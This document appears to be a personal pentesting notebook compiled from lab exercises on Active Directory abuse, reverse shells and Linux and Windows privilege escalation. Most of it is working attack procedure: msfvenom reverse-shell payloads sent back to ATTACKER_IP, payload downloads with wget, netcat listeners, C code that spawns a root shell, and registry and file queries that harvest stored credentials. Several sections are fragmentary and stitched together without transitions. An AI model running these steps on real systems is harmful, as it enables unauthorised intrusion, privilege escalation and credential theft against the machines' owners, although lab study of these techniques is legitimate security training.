example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques

Enumeration w/Server Manager


Because servers are hardly ever logged on unless its for maintenance this gives you an easy way for enumeration only using the built in windows features such as the server manager. If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.

The only way to access the server manager is to rdp into the server and access the server over an rdp connection

We'll only be going over the basics such as looking at users, groups, and trusts however there are a lot of other mischief that you can get your hands on in terms of enumerating with the server manager

This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it.

Intro to shells

One of the most prominent of these is Payloads all the Things. The PentestMonkey Reverse Shell Cheatsheet is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.

Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener.

msfvenom
  
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.98 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe


Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.

Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

#Payload Naming Conventions

  When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
  <OS>/<arch>/<payload>

  For example:
  linux/x86/shell_reverse_tcp
  This would generate a stageless reverse shell for an x86 Linux target.

  The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
  windows/shell_reverse_tcp

  For a 64bit Windows target, the arch would be specified as normal (x64).

  Let's break the payload section down a little further.
  In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). 

  The staged equivalent to this payload would be:
    shell/reverse_tcp
  As staged payloads are denoted with another forward slash (/).

  This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
  windows/x64/meterpreter/reverse_tcp

  A Linux 32bit stageless Meterpreter payload would look like this:

  linux/x86/meterpreter_reverse_tcp

  Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

  msfvenom --list payloads

  This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads.
-=-=-=-=-
Once we gain access to a shell

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
 or C:\xampp\FileZilla Server\FileZilla Server.xml
. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.


The syntax for this is as follows:

net user <username> <password> /add

net localgroup administrators <username> /add

 /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
 /etc/issue
 ps Command
  The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
  The output of the ps (Process Status) will show the following;
    PID: The process ID (unique to the process)
    TTY: Terminal type used by the user
    Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    CMD: The command or executable running (will NOT display any command line parameter)

  The “ps” command provides a few useful options.

    ps -A: View all running processes
    ps axjf: View process tree (see the tree formation until ps axjf is run below)
    ps aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

  env

    The env command will show environmental variables.
    The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
    If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH

  sudo -l
    The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.

  Id
    The id command will provide a general overview of the user’s privilege level and group memberships.
    It is worth remembering that the id command can also be used to obtain the same information for another user as seen below.

  /etc/passwd
    Reading the /etc/passwd file can be an easy way to discover users on the system.

  history
    Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

  ifconfig
    The target system may be a pivoting point to another network. 

  ip route 
    To see wich network routes exist

  netstat
      netstat -a: shows all listening ports and established connections.
      netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
      netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
      netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol. 
      netstat -tp: list connections with the service name and PID information. This can also be used with the -l option to list listening ports
      netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

  The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

      -a: Display all sockets
      -n: Do not resolve names
      -o: Display timers

  find Command

  Find files:

      find . -name flag1.txt: find the file named “flag1.txt” in the current directory
      find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
      find / -type d -name config: find the directory named config under “/”
      find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
      find / -perm a=x: find executable files
      find /home -user frank: find all files for user “frank” under “/home”
      find / -mtime 10: find files that were modified in the last 10 days
      find / -atime 10: find files that were accessed in the last 10 day
      find / -cmin -60: find files changed within the last hour (60 minutes)
      find / -amin -60: find files accesses within the last hour (60 minutes)
      find / -size 50M: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

  It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output 


  Folders and files that can be written to or executed from:

      find / -writable -type d 2>/dev/null : Find world-writeable folders
      find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
      find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

  The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.


      find / -perm -o x -type d 2>/dev/null : Find world-executable folders

  Find development tools and supported languages:

      find / -name perl*
      find / -name python*
      find / -name gcc*

  Find specific file permissions:

  Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

      find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 


  cat /etc/shells #Check available shells

  1 –> Sticky Bit

  2 –> SGID

  4 –> SUID

  7 –> Todos los anteriores

  find / -perm -u=s -type f 2>/dev/null
  find / -perm /4000 -type f 2>/dev/null
  find / -user root -perm -4000 -exec ls -ldb {} \;
  find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.

sudo LD_PRELOAD=/tmp/exploiting.so program-name-here
-=-=-=
Another example with LD_PRELOAD 

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

The function is named _init and that's important, otherwise your exploit code won't work. The reason is that the  _init function runs before any other user-defined code runs, to perform all the necessary initializations. So the name has to be the same, or else it won't work*

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

gcc -fPIC -shared -o shell.so shell.c -nostartfiles


We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

This will result in a shell spawn with root privileges.

Privilege escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled Capabilities. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

getcap -r / 2>/dev/null

PATH  

We could use this script:
#include <unistd.h>
void main()
{
    setuid(0);
    setgid(0);
    system("thm");
}

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit
  gcc path_exp.c -o path -w
  chmod u+s path

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “find / -writable 2>/dev/null” command
find / -writable 2>/dev/null | cut -d"/" -f 2,3 | sort -u

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it.
  export PATH=/tmp:$PATH

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

-=-=-=-=
Network File Sharing

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.
  showmount -e 10.10.45.161

We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
#In our machine 
  mkdir /tmp/loquesea 
  mount -o rw 10.10.45.161:/<el share> /tmp/loquesea

#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

9.SSH
SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

    ssh -L 80:intra.example.com:80 gw.example.com 
    ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com

2.) Then this - sudo ./build-alpine
3.) If above command run properly without errors then congrats!
4.) If not maybe the error is due to mirror sites but it will create a rootfs directory in same folder i.e "lxd-alpine-builder" .
5.) Goto - cd/rootfs/usr/share/alpine-mirrors/Mirrors.txt
6.) Open that .txt file with any editor and remove all the mirror sites except first one, then save it there only.
7.) Again run - sudo ./build-alpine

/etc/passwd
    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    Group ID (GID): The primary group ID (stored in /etc/group file)
    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

If we can write on it:
  Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]

chmod +xs /tmp/rootbash
/tmp/rootbash -p

#another example
The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job

Windows privilege escalation
https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1.Harvesting passwords from usual spots

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem
	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service
	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
tasklist /svc | findstr /i windowsscheduler
Network Service
	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

#Cleartext passwords 
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 


Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

cmdkey /list

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

runas /savecred /user:admin cmd.exe


IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

#Another way 
Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force


Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.
Command Prompt

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

        

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.87.69 LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt

C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

Abusing Service Misconfigurations
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:

Command Prompt

C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem

        

Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

Service DACL

All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:

Service registry entries

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.


Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:
Command Prompt

C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1

        

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in C:\Progra~2\System~1\WService.exe. We then proceed to check the permissions on the executable:
Command Prompt

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

        

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

        

We can then pull the payload from Powershell with the following command:
Powershell

wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

        

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
Command Prompt

C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.

        

We start a reverse listener on our attacker machine:
Kali Linux

user@attackerpc$ nc -lvp 4445

        

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
Command Prompt

C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler

        

Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445

Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:
Command Prompt

C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

        

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:
Command Prompt

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

        

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		


This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:
Command Prompt

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

        

The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446

        

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to C:\MyPrograms\Disk.exe. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
Command Prompt

C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.

        

Once the service gets restarted, your payload should execute:
Command Prompt

C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"

        

As a result, you'll get a reverse shell with svcusr2 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4446

Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:
Command Prompt

C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

        

Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447

        

We will then transfer the reverse shell executable to the target machine and store it in C:\Users\thm-unpriv\rev-svc3.exe. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
Command Prompt

C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

        

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
Command Prompt

C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

        

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
Command Prompt

C:\> sc stop THMService
C:\> sc start THMService

        

And we will receive a shell back in our attacker's machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447

Abusing dangerous privileges
